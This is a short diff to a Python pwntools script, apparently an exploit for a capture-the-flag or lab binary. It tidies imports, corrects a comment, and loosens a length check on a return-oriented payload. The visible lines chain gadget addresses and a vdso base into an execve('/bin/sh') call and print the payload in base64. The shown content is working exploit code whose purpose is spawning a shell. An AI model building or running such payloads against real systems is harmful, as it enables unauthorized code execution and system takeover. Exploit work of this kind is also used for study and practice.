@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from pwn import *
+from pwn import b64e, p32
 
 
 vdso_addr = 0xf7ffc000
@@ -71,9 +71,9 @@ payload += p32(pop_edx_pop_ecx_ret_addr)
 payload += p32(0)
 payload += p32(bin_sh_addr + 0x30)
 
-# sys_execve("/bin/sh", ["/bin/sh"], NULL]
+# sys_execve("/bin/sh", ["/bin/sh", NULL], NULL)
 payload += p32(int_0x80_xor_eax_eax_ret_addr)
 
 
-assert len(payload) < 0x200
+assert len(payload) <= 0x200
 print(b64e(payload))
